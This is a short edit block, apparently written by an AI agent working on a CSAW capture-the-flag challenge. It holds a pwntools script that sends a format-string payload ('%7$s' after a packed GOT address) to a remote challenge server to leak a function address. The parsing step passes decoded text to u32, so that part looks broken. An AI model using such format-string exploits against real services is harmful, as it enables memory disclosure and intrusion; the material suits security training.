edit 1:15
from pwn import *

# GOT entry for lose
got_lose = 0x0804a010

p = remote("pwn.chal.csaw.io", 8000)
p.recvuntil(b"GOT milk? ")

# Payload to leak the address at got_lose
# Put the address at the beginning, then use %7$s to read from it
payload = p32(got_lose) + b"%7$s"
p.sendline(payload)

response = p.recvall(timeout=2).decode(errors='ignore')
print(f"Response: {response}")

# Extract the leaked address
# The response should be "Your answer: [4 bytes of got_lose][leaked address]"
if len(response) > 20:
    leaked_addr = u32(response[16:20])
    print(f"Leaked lose address: {hex(leaked_addr)}")
else:
    print("Failed to leak address")

p.close()
end_of_edit

